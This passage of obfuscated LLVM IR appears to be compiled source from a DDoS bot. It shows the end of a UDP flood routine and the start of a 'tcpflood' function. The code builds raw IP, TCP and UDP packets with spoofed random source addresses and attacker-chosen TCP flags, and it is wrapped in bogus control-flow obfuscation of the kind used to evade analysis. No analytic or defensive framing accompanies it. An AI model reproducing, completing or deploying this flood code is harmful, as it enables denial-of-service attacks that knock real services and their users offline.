; <label>:380:                                    ; preds = %originalBBpart258, %originalBBpart254
  %381 = phi i32 [ %350, %originalBBpart254 ], [ %371, %originalBBpart258 ]
  %382 = trunc i32 %381 to i16
  %383 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %384 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %383, i32 0, i32 1
  store i16 %382, i16* %384, align 2
  %385 = call i32 @rand_cmwc()
  %386 = trunc i32 %385 to i16
  %387 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 3
  store i16 %386, i16* %388, align 4
  %389 = load i32, i32* %20, align 4
  %390 = call i32 @getRandomIP(i32 %389)
  %391 = call i32 @htonl(i32 %390) #9
  %392 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 8
  store i32 %391, i32* %393, align 4
  %394 = bitcast i8* %237 to i16*
  %395 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 2
  %397 = load i16, i16* %396, align 2
  %398 = zext i16 %397 to i32
  %399 = call zeroext i16 @csum(i16* %394, i32 %398)
  %400 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 7
  store i16 %399, i16* %401, align 2
  %402 = load i32, i32* %25, align 4
  %403 = load i32, i32* %12, align 4
  %404 = icmp eq i32 %402, %403
  br i1 %404, label %405, label %444

; <label>:405:                                    ; preds = %380
  %406 = load i32, i32* @x.21
  %407 = load i32, i32* @y.22
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %405
  %414 = call i64 @time(i64* null) #6
  %415 = load i32, i32* %24, align 4
  %416 = sext i32 %415 to i64
  %417 = icmp sgt i64 %414, %416
  %418 = load i32, i32* @x.21
  %419 = load i32, i32* @y.22
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %417, label %426, label %427

; <label>:426:                                    ; preds = %originalBBpart262
  br label %447

; <label>:427:                                    ; preds = %originalBBpart262
  %428 = load i32, i32* @x.21
  %429 = load i32, i32* @y.22
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %427
  store i32 0, i32* %25, align 4
  %436 = load i32, i32* @x.21
  %437 = load i32, i32* @y.22
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %330

; <label>:444:                                    ; preds = %380
  %445 = load i32, i32* %25, align 4
  %446 = add i32 %445, 1
  store i32 %446, i32* %25, align 4
  br label %330

; <label>:447:                                    ; preds = %426
  %448 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %448)
  br label %449

; <label>:449:                                    ; preds = %447, %177, %171, %166, %110, %originalBBpart24, %43
  %450 = load i32, i32* @x.21
  %451 = load i32, i32* @y.22
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %449
  %458 = load i32, i32* @x.21
  %459 = load i32, i32* @y.22
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %50
  %466 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %466, i32* %13, align 4
  %467 = load i32, i32* %13, align 4
  %468 = icmp ne i32 %467, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %87
  %469 = load i32, i32* %8, align 4
  %_ = sub i32 %469, 1
  %gen = mul i32 %_, 1
  %470 = add nsw i32 %469, 1
  %471 = sext i32 %470 to i64
  %472 = call noalias i8* @malloc(i64 %471) #6
  store i8* %472, i8** %14, align 8
  %473 = load i8*, i8** %14, align 8
  %474 = icmp eq i8* %473, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %179
  %475 = load i32, i32* %19, align 4
  %_15 = sub i32 0, %475
  %gen16 = add i32 %_15, -1
  %_17 = shl i32 %475, -1
  %_18 = sub i32 %475, -1
  %gen19 = mul i32 %_18, -1
  %_20 = sub i32 %475, -1
  %gen21 = mul i32 %_20, -1
  %_22 = shl i32 %475, -1
  %_23 = shl i32 %475, -1
  %_24 = sub i32 %475, -1
  %gen25 = mul i32 %_24, -1
  %_26 = shl i32 %475, -1
  %476 = add nsw i32 %475, -1
  store i32 %476, i32* %19, align 4
  %477 = icmp ne i32 %475, 0
  br label %originalBB14

originalBB30alteredBB:                            ; preds = %originalBB30, %199
  %478 = call i64 @time(i64* null) #6
  %479 = call i32 @rand_cmwc()
  %480 = zext i32 %479 to i64
  %_31 = sub i64 0, %478
  %gen32 = add i64 %_31, %480
  %481 = xor i64 %478, %480
  %482 = trunc i64 %481 to i32
  call void @srand(i32 %482) #6
  %483 = call i32 @rand() #6
  call void @init_rand(i32 %483)
  br label %originalBB30

originalBB36alteredBB:                            ; preds = %originalBB36, %267
  %484 = call i32 @rand_cmwc()
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %290
  %485 = trunc i32 %291 to i16
  %486 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %487 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %486, i32 0, i32 1
  store i16 %485, i16* %487, align 2
  %488 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %489 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %488, i32 0, i32 3
  store i16 0, i16* %489, align 2
  %490 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %491 = bitcast %struct.udphdr* %490 to i8*
  %492 = getelementptr inbounds i8, i8* %491, i64 8
  %493 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %492, i32 %493)
  %494 = bitcast i8* %237 to i16*
  %495 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 2
  %497 = load i16, i16* %496, align 2
  %498 = zext i16 %497 to i32
  %499 = call zeroext i16 @csum(i16* %494, i32 %498)
  %500 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 7
  store i16 %499, i16* %501, align 2
  %502 = call i64 @time(i64* null) #6
  %503 = load i32, i32* %7, align 4
  %504 = sext i32 %503 to i64
  %_41 = sub i64 0, %502
  %gen42 = add i64 %_41, %504
  %_43 = shl i64 %502, %504
  %_44 = sub i64 %502, %504
  %gen45 = mul i64 %_44, %504
  %_46 = shl i64 %502, %504
  %_47 = sub i64 0, %502
  %gen48 = add i64 %_47, %504
  %505 = add nsw i64 %502, %504
  %506 = trunc i64 %505 to i32
  store i32 %506, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %originalBB40

originalBB52alteredBB:                            ; preds = %originalBB52, %341
  %507 = call i32 @rand_cmwc()
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %359
  %508 = load i32, i32* %6, align 4
  %509 = trunc i32 %508 to i16
  %510 = call zeroext i16 @htons(i16 zeroext %509) #9
  %511 = zext i16 %510 to i32
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %405
  %512 = call i64 @time(i64* null) #6
  %513 = load i32, i32* %24, align 4
  %514 = sext i32 %513 to i64
  %515 = icmp sgt i64 %512, %514
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %427
  store i32 0, i32* %25, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %449
  br label %originalBB68
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %24 = load i32, i32* %12, align 4
  store i32 %24, i32* %13, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %48

; <label>:28:                                     ; preds = %5
  %29 = load i32, i32* @x.23
  %30 = load i32, i32* @y.24
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* @x.23
  %41 = load i32, i32* @y.24
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %69

; <label>:48:                                     ; preds = %5
  %49 = load i32, i32* @x.23
  %50 = load i32, i32* @y.24
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load i32, i32* %7, align 4
  %58 = trunc i32 %57 to i16
  %59 = call zeroext i16 @htons(i16 zeroext %58) #9
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @x.23
  %62 = load i32, i32* @y.24
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart24, %originalBBpart2
  %70 = load i8*, i8** %6, align 8
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %72 = call i32 @getHost(i8* %70, %struct.in_addr* %71)
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %69
  br label %511

; <label>:75:                                     ; preds = %69
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %77 = getelementptr inbounds [8 x i8], [8 x i8]* %76, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %77, i8 0, i64 8, i32 4, i1 false)
  %78 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %78, i32* %15, align 4
  %79 = load i32, i32* %15, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %82, label %81

; <label>:81:                                     ; preds = %75
  br label %511

; <label>:82:                                     ; preds = %75
  %83 = load i32, i32* @x.23
  %84 = load i32, i32* @y.24
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  store i32 1, i32* %16, align 4
  %91 = load i32, i32* %15, align 4
  %92 = bitcast i32* %16 to i8*
  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #6
  %94 = icmp slt i32 %93, 0
  %95 = load i32, i32* @x.23
  %96 = load i32, i32* @y.24
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %94, label %103, label %104

; <label>:103:                                    ; preds = %originalBBpart28
  br label %511

; <label>:104:                                    ; preds = %originalBBpart28
  %105 = load i32, i32* %11, align 4
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %104
  store i32 0, i32* %17, align 4
  br label %130

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @x.23
  %110 = load i32, i32* @y.24
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i32, i32* %11, align 4
  %118 = sub nsw i32 32, %117
  %119 = shl i32 1, %118
  %120 = sub nsw i32 %119, 1
  %121 = xor i32 %120, -1
  store i32 %121, i32* %17, align 4
  %122 = load i32, i32* @x.23
  %123 = load i32, i32* @y.24
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart236, label %originalBB10alteredBB

originalBBpart236:                                ; preds = %originalBB10
  br label %130

; <label>:130:                                    ; preds = %originalBBpart236, %107
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = add i64 40, %132
  %134 = call i8* @llvm.stacksave()
  store i8* %134, i8** %18, align 8
  %135 = alloca i8, i64 %133, align 16
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %19, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = getelementptr i8, i8* %138, i64 20
  %140 = bitcast i8* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %20, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %143 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 4
  %145 = load i32, i32* %17, align 4
  %146 = call i32 @getRandomIP(i32 %145)
  %147 = call i32 @htonl(i32 %146) #9
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = add i64 20, %149
  %151 = trunc i64 %150 to i32
  call void @makeIPPacket(%struct.iphdr* %141, i32 %144, i32 %147, i8 zeroext 6, i32 %151)
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon* %155 to %struct.anon.0*
  %157 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 4
  %158 = call i32 @rand_cmwc()
  %159 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %160 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon* %160 to %struct.anon.0*
  %162 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %161, i32 0, i32 2
  store i32 %158, i32* %162, align 4
  %163 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 3
  store i32 0, i32* %166, align 4
  %167 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -241
  %173 = or i16 %172, 80
  store i16 %173, i16* %170, align 4
  %174 = load i8*, i8** %10, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %213, label %177

; <label>:177:                                    ; preds = %130
  %178 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon* %179 to %struct.anon.0*
  %181 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -513
  %184 = or i16 %183, 512
  store i16 %184, i16* %181, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = and i16 %189, -1025
  %191 = or i16 %190, 1024
  store i16 %191, i16* %188, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon* %193 to %struct.anon.0*
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -257
  %198 = or i16 %197, 256
  store i16 %198, i16* %195, align 4
  %199 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon* %200 to %struct.anon.0*
  %202 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = and i16 %203, -4097
  %205 = or i16 %204, 4096
  store i16 %205, i16* %202, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 0
  %208 = bitcast %union.anon* %207 to %struct.anon.0*
  %209 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %210, -2049
  %212 = or i16 %211, 2048
  store i16 %212, i16* %209, align 4
  br label %385

; <label>:213:                                    ; preds = %130
  %214 = load i8*, i8** %10, align 8
  %215 = call i8* @strtok(i8* %214, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %215, i8** %21, align 8
  br label %216

; <label>:216:                                    ; preds = %382, %213
  %217 = load i8*, i8** %21, align 8
  %218 = icmp ne i8* %217, null
  br i1 %218, label %219, label %384

; <label>:219:                                    ; preds = %216
  %220 = load i32, i32* @x.23
  %221 = load i32, i32* @y.24
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %219
  %228 = load i8*, i8** %21, align 8
  %229 = call i32 @strcmp(i8* %228, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %230 = icmp ne i32 %229, 0
  %231 = load i32, i32* @x.23
  %232 = load i32, i32* @y.24
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %230, label %263, label %239

; <label>:239:                                    ; preds = %originalBBpart240
  %240 = load i32, i32* @x.23
  %241 = load i32, i32* @y.24
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %239
  %248 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %252, -513
  %254 = or i16 %253, 512
  store i16 %254, i16* %251, align 4
  %255 = load i32, i32* @x.23
  %256 = load i32, i32* @y.24
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart259, label %originalBB42alteredBB

originalBBpart259:                                ; preds = %originalBB42
  br label %382

; <label>:263:                                    ; preds = %originalBBpart240
  %264 = load i32, i32* @x.23
  %265 = load i32, i32* @y.24
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %263
  %272 = load i8*, i8** %21, align 8
  %273 = call i32 @strcmp(i8* %272, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %274 = icmp ne i32 %273, 0
  %275 = load i32, i32* @x.23
  %276 = load i32, i32* @y.24
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %274, label %307, label %283

; <label>:283:                                    ; preds = %originalBBpart263
  %284 = load i32, i32* @x.23
  %285 = load i32, i32* @y.24
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %283
  %292 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = and i16 %296, -1025
  %298 = or i16 %297, 1024
  store i16 %298, i16* %295, align 4
  %299 = load i32, i32* @x.23
  %300 = load i32, i32* @y.24
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart281, label %originalBB65alteredBB

originalBBpart281:                                ; preds = %originalBB65
  br label %381

; <label>:307:                                    ; preds = %originalBBpart263
  %308 = load i8*, i8** %21, align 8
  %309 = call i32 @strcmp(i8* %308, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %310 = icmp ne i32 %309, 0
  br i1 %310, label %319, label %311

; <label>:311:                                    ; preds = %307
  %312 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 0
  %314 = bitcast %union.anon* %313 to %struct.anon.0*
  %315 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = and i16 %316, -257
  %318 = or i16 %317, 256
  store i16 %318, i16* %315, align 4
  br label %380

; <label>:319:                                    ; preds = %307
  %320 = load i8*, i8** %21, align 8
  %321 = call i32 @strcmp(i8* %320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %347, label %323

; <label>:323:                                    ; preds = %319
  %324 = load i32, i32* @x.23
  %325 = load i32, i32* @y.24
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %323
  %332 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon* %333 to %struct.anon.0*
  %335 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %334, i32 0, i32 4
  %336 = load i16, i16* %335, align 4
  %337 = and i16 %336, -4097
  %338 = or i16 %337, 4096
  store i16 %338, i16* %335, align 4
  %339 = load i32, i32* @x.23
  %340 = load i32, i32* @y.24
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart2105, label %originalBB83alteredBB

originalBBpart2105:                               ; preds = %originalBB83
  br label %379

; <label>:347:                                    ; preds = %319
  %348 = load i8*, i8** %21, align 8
  %349 = call i32 @strcmp(i8* %348, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %359, label %351

; <label>:351:                                    ; preds = %347
  %352 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %353 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %352, i32 0, i32 0
  %354 = bitcast %union.anon* %353 to %struct.anon.0*
